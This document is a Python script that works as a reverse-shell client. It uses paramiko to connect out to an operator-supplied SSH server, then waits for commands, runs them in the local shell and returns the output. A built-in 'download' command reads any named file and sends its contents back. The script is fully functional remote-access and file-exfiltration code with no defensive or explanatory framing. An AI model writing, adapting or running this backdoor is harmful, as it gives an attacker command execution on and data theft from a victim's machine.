#!/usr/bin/env python3
import paramiko
import subprocess
import time
import os
import sys
import traceback


def start_client(server_ip, server_port, username, password):
    client = paramiko.SSHClient()
    # Automatically add the server's host key (for testing purposes only).
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server_ip, port=server_port, username=username, password=password)
    except Exception as e:
        print("[-] Connection failed: " + str(e))
        sys.exit(1)

    # Open a session channel.
    chan = client.get_transport().open_session()
    # Send an initial greeting to the server.
    chan.send("Client Connected.\n")

    # Maintain current directory state.
    current_dir = os.getcwd()

    try:
        while True:
            if chan.recv_ready():
                command = chan.recv(4096).decode().strip()
                if not command:
                    continue

                # Check for exit command.
                if command.lower() == "exit":
                    print("[-] Exit command received. Closing connection.")
                    break

                # Built-in command: change directory.
                if command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        current_dir = os.getcwd()
                        output = f"Changed directory to {current_dir}\n".encode()
                    except Exception as e:
                        output = f"Failed to change directory: {e}\n".encode()

                # Built-in command: download file.
                elif command.startswith("download "):
                    filename = command.split(" ", 1)[1].strip()
                    try:
                        with open(filename, "rb") as f:
                            file_data = f.read()
                        # Wrap the file data with markers.
                        output = b"FILE_DOWNLOAD_START\n" + file_data + b"\nFILE_DOWNLOAD_END\n"
                    except Exception as e:
                        output = f"Failed to download file: {e}\n".encode()

                # Execute any other command in the local shell.
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        output = e.output
                    except Exception as e:
                        output = f"Failed to execute command: {e}\n".encode()

                # If there is no output, send a confirmation message.
                if not output:
                    output = b"Command executed.\n"
                chan.send(output)
            # Sleep briefly to avoid busy waiting.
            time.sleep(1)
    except KeyboardInterrupt:
        print("[-] KeyboardInterrupt detected. Exiting.")
    except Exception as e:
        print("[-] Exception: " + str(e))
        traceback.print_exc()
    finally:
        chan.close()
        client.close()


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 client.py <server_ip> <server_port> <username> <password>")
        sys.exit(1)
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    username = sys.argv[3]
    password = sys.argv[4]
    start_client(server_ip, server_port, username, password)
